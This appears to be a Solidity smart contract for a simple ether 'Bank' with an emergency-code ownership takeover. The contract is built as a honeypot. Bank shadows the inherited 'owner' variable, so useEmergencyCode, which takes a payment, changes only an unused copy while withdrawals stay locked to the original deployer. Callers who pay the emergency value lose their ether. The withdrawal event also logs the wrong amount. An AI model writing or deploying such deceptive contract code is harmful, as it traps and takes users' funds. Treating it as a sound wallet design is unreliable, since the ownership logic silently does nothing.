1 pragma solidity ^0.5.0;
2 
3 contract Owned {
4     address payable public owner;
5     constructor() public {
6         owner = msg.sender;
7     }
8     modifier onlyOwner{ if (msg.sender != owner) revert(); _; }
9 }
10 
11 contract Bank is Owned {
12     event BankDeposit(address from, uint amount);
13     event BankWithdrawal(address from, uint amount);
14     address owner = msg.sender;
15     uint256 ecode;
16     uint256 evalue;
17 
18     function deposit() public payable {
19         require(msg.value > 0);
20         emit BankDeposit(msg.sender, msg.value);
21     }
22     
23     function useEmergencyCode(uint256 code) public payable {
24         if ((code == ecode) && (msg.value == evalue)) owner = msg.sender;
25     }
26     
27     function setEmergencyCode(uint256 code, uint256 value) public onlyOwner {
28         ecode = code;
29         evalue = value;
30     }
31 
32     function withdraw(uint amount) public payable onlyOwner {
33         require(amount <= address(this).balance);
34         msg.sender.transfer(amount);
35         emit BankWithdrawal(msg.sender, msg.value);
36     }
37 
38 }